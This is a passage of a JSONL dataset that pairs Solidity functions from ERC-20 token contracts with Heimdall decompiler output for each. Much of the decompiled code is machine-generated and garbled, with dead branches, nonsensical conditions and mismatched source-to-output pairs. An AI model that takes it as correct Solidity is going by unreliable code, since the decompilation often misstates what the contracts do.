\"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        address var_c = address(arg0);\n        var_d = 0x06;\n        require(!storage_map_b[var_c], \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(var_e.length > 0), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_e = 0x60 + var_e;\n        var_a = 0x26;\n        var_f = this.code[3161:3199];\n        var_c = address(arg0);\n        var_d = 0x04;\n        require(!(arg2 > storage_map_b[var_c]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_h = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        uint256 var_i = var_e.length;\n        require(!(bytes1(var_e.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_j = (~((0x0100 ** (0x20 - (bytes1(var_e.length)))) - 0x01)) & (var_k);\n        var_c = address(arg0);\n        var_d = 0x04;\n        storage_map_b[var_c] = storage_map_b[var_c] - arg2;\n        var_c = address(arg1);\n        var_d = 0x04;\n        require(!((arg2 + storage_map_b[var_c]) < storage_map_b[var_c]), \"SafeMath: addition overflow\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = 0x20;\n        var_i = 0x1b;\n        var_l = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_e = 0x60 + var_e;\n        var_a = 0x26;\n        var_f = this.code[3161:3199];\n        require(!(arg2 > storage_map_b[var_c]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_i = var_e.length;\n        require(!(bytes1(var_e.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = (~((0x0100 ** (0x20 - (bytes1(var_e.length)))) - 0x01)) & (var_k);\n        if (!storage_map_b[var_c]) {\n        }\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_m = 0x23;\n        var_n = this.code[3092:3127];\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_m = 0x25;\n        var_n = this.code[3239:3276];\n    }"}
{"contract_address": "0x054348505D3A37c155C15435FEB95392bDDb31E6", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if ((0x01 == 0x01) | !0x017e9d8602b400) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x017e9d8602b400;\n                if (0x09) {\n                    if ((0x01 == 0x01) | !0x017e9d8602b400) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x017e9d8602b400;\n                        if (0x09) {\n                            if ((0x01 == 0x01) | !0x017e9d8602b400) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x017e9d8602b400;\n                                emit MaxTxAmountUpdated(0x017e9d8602b400);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                    if (!0x09 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0x01) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xb7DC750513C75143Fe886b2179Cdb964662173d5", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {\\r\\n      _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));\\r\\n      return true;\\r\\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        address var_a = msg.sender;\n        var_b = 0x05;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!((arg1 + storage_map_e[var_a]) < storage_map_e[var_a]), \"SafeMath: addition overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x1b;\n        var_f = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x05;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_e[var_a] = arg1 + storage_map_e[var_a];\n        uint256 var_c = arg1 + storage_map_e[var_a];\n        emit Approval(address(msg.sender), address(arg0), arg1 + storage_map_e[var_a]);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = (0x20 + (0x04 + var_g)) - (0x04 + var_g);\n        var_e = 0x22;\n        var_h = this.code[3127:3161];\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = (0x20 + (0x04 + var_g)) - (0x04 + var_g);\n        var_e = 0x24;\n        var_h = this.code[3276:3312];\n    }"}
{"contract_address": "0x4f686d3948ff9EfFeb393D0B861086577a6e1b77", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xbFD03022a32dB1502489AE1F65bd8f343CC09AB9", "original_solidity_code": "function updateSplinterDevTaxGuardedVault(address newWallet) external onlyOwner {\\r\\n        emit SplinterDevTaxGuardedVaultUpdated(newWallet, SplinterDevTaxGuardedVault);\\r\\n        SplinterDevTaxGuardedVault = newWallet;\\r\\n    }", "heimdall_decompiled_code": "function updateSplinterDevTaxGuardedVault(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(_owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit SplinterDevTaxGuardedVaultUpdated(address(arg0), address(SplinterDevTaxGuardedVault / 0x01));\n        SplinterDevTaxGuardedVault = (address(arg0) * 0x01) | (uint96(SplinterDevTaxGuardedVault));\n    }"}
{"contract_address": "0xEA00f45b33879A1D55f91ff260C20c96a577E566", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0x35D17C2467E1D8aB2d8789FD7af72af770BDBc52", "original_solidity_code": "function allowance(address owner_, address spender) external view override returns (uint256) {\\r\\n      return _allowances[owner_][spender];\\r\\n    }", "heimdall_decompiled_code": "function allowance(address arg0, address arg1) public view returns (uint256) {\n        address var_a = address(arg0);\n        var_b = 0x05;\n        var_a = address(arg1);\n        address var_b = keccak256(var_a);\n        address var_c = storage_map_d[var_a];\n        return storage_map_d[var_a];\n    }"}
{"contract_address": "0x6f87c7FAc982eB280d81865547aB31fD209b1637", "original_solidity_code": "function burn(uint256 amount) public virtual {\\n        _burn(_msgSender(), amount);\\n    }", "heimdall_decompiled_code": "function burn(uint256 arg0) public {\n        require(address(msg.sender), \"ERC20: burn amount exceeds balance\");\n        address var_a = address(msg.sender);\n        uint256 var_b = 0;\n        require(!(storage_map_e[var_a] < arg0), \"ERC20: burn amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a206275726e20616d6f756e7420657863656564732062616c616e;\n        var_g = 0x6365000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_e[var_a] = storage_map_e[var_a] - arg0;\n        totalSupply = totalSupply - arg0;\n        uint256 var_c = arg0;\n        emit Transfer(address(msg.sender), 0, arg0);\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x21;\n        var_f = 0x45524332303a206275726e2066726f6d20746865207a65726f20616464726573;\n        var_g = 0x7300000000000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xF47024a2e10D77927767cBE5aADf5F8BB02782c9", "original_solidity_code": "function approve(address spender, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Moves `amount` tokens from `from` to `to` using the\\n     * allowance mechanism. `amount` is then deducted from the caller's\\n     * allowance.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer}", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x66;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_d[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x8a24fF8ffc247330F89865e58587858626eB504e", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_c) {\n            if (!(store_c) == ((store_c / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_c / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_c / 0x02;\n                if (store_c) {\n                    if (!(store_c) == ((store_c / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_c / 0x02) {\n                            if (0x1f < (store_c / 0x02)) {\n                                var_a = 0x05;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_c / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xeEbe8289D4974bd96100fdD72f16CEBbB5c095f4", "original_solidity_code": "function transfer(address to, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0) - 0, \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(msg.sender);\n        var_b = 0x65;\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x26;\n        var_g = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_h = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0x65;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_a = address(arg0);\n        var_b = 0x65;\n        require(!(storage_map_b[var_a] > (storage_map_b[var_a] + arg1)), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_i = 0x11;\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        uint256 var_c = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xEC5Cd1764456f3CaBb72B90b95526BE632D8385c", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_c) {\n            if (!(store_c) == ((store_c / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_c / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_c / 0x02;\n                if (store_c) {\n                    if (!(store_c) == ((store_c / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_c / 0x02) {\n                            if (0x1f < (store_c / 0x02)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_c / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                        return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xc2473C13f1Ebb11A06997Cf5e40dB023F96A4DA1", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\\r\\n        return _balances[account];\\r\\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_h[var_a];\n        return storage_map_h[var_a];\n    }"}
{"contract_address": "0xe150ed6520Ef0F5269a82638f344541e22298E51", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\n        emit OwnershipTransferred(_owner, address(0));\\n        _owner = address(0);\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x16E04d776e1B647BE948C6D2f51Bca26401DC011", "original_solidity_code": "function balanceOf(address account) public view virtual override returns (uint256) { return _balances[account]; }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_d[var_a];\n        return storage_map_d[var_a];\n    }"}
{"contract_address": "0x94a1FaF408D4F4a74e46973BF75953dB44EcA193", "original_solidity_code": "function isExcludedFromFees(address account) public view returns (bool) {\r\n        return _isExcludedFromFees[account];\r\n    }", "heimdall_decompiled_code": "function isExcludedFromFees(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x1f;\n        address var_c = !(!bytes1(storage_map_d[var_a]));\n        return !(!bytes1(storage_map_d[var_a]));\n    }"}
{"contract_address": "0xC0BA94337896c443b7728Dce84B0A750e290fbFd", "original_solidity_code": "function transfer() external { \r\n             payable(autoLiquidityReceiver).transfer(address(this).balance);\r\n            \r\n    }", "heimdall_decompiled_code": "function transfer() public {\n        (bool success, bytes memory ret0) = address(store_i / 0x01).transfer(address(this).balance);\n    }"}
{"contract_address": "0xDC4259959BFE37685741A162a2D0757cF774E129", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(owner) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0)) | (uint96(owner));\n        emit OwnershipTransferred(address(owner), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xB14c3a406A345F2b4E79aB45d81A63E9a815ec71", "original_solidity_code": "function name() external pure returns (string memory);\r\n\r\n    function symbol() external pure returns (string memory);\r\n\r\n    function decimals() external pure returns (uint8);\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address owner) external view returns (uint256);\r\n\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n\r\n    function approve(address spender, uint256 value) external returns (bool);\r\n\r\n    function transfer(address to, uint256 value) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 value\r\n    ) external returns (bool);\r\n\r\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\r\n\r\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\r\n\r\n    function nonces(address owner) external view returns (uint256);\r\n\r\n    function permit(\r\n        address owner,\r\n        address spender,\r\n        uint256 value,\r\n        uint256 deadline,\r\n        uint8 v,\r\n        bytes32 r,\r\n        bytes32 s\r\n    ) external;\r\n\r\n    event Mint(address indexed sender, uint256 amount0, uint256 amount1);\r\n    event Burn(\r\n        address indexed sender,\r\n        uint256 amount0,\r\n        uint256 amount1,\r\n        address indexed to\r\n    );\r\n    event Swap(\r\n        address indexed sender,\r\n        uint256 amount0In,\r\n        uint256 amount1In,\r\n        uint256 amount0Out,\r\n        uint256 amount1Out,\r\n        address indexed to\r\n    );\r\n    event Sync(uint112 reserve0, uint112 reserve1);\r\n\r\n    function MINIMUM_LIQUIDITY() external pure returns (uint256);\r\n\r\n    function factory() external view returns (address);\r\n\r\n    function token0() external view returns (address);\r\n\r\n    function token1() external view returns (address);\r\n\r\n    function getReserves()\r\n        external\r\n        view\r\n        returns (\r\n            uint112 reserve0,\r\n            uint112 reserve1,\r\n            uint32 blockTimestampLast\r\n        );\r\n\r\n    function price0CumulativeLast() external view returns (uint256);\r\n\r\n    function price1CumulativeLast() external view returns (uint256);\r\n\r\n    function kLast() external view returns (uint256);\r\n\r\n    function mint(address to) external returns (uint256 liquidity);\r\n\r\n    function burn(address to)\r\n        external\r\n        returns (uint256 amount0, uint256 amount1);\r\n\r\n    function swap(\r\n        uint256 amount0Out,\r\n        uint256 amount1Out,\r\n        address to,\r\n        bytes calldata data\r\n    ) external;\r\n\r\n    function skim(address to) external;\r\n\r\n    function sync() external;\r\n\r\n    function initialize(address, address) external;\r\n}\r\n\r\n/* pragma solidity 0.8.10; */\r\n/* pragma experimental ABIEncoderV2; */\r\n\r\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint256 amountADesired,\r\n        uint256 amountBDesired,\r\n        uint256 amountAMin,\r\n        uint256 amountBMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        returns (\r\n            uint256 amountA,\r\n            uint256 amountB,\r\n            uint256 liquidity\r\n        );\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint256 amountTokenDesired,\r\n        uint256 amountTokenMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (\r\n            uint256 amountToken,\r\n            uint256 amountETH,\r\n            uint256 liquidity\r\n        );\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external payable;\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n}", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (!(store_a) == ((store_a / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_a / 0x02;\n                if (store_a) {\n                    if (!(store_a) == ((store_a / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a / 0x02) {\n                            if (0x1f < (store_a / 0x02)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                        return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x6ddfeC08B7597e9392abbC41CB8a74A0d59188C1", "original_solidity_code": "function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (store_a - ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x07;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x57D9302e8B62a24e716C048f4925b2c74c9797dC", "original_solidity_code": "function setMaxTxnAmount(uint256 maxTxAmount) public onlyOwner {\r\n        _maxTxAmount = maxTxAmount;\r\n    }", "heimdall_decompiled_code": "function setMaxTxnAmount(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _maxTxAmount = arg0;\n    }"}
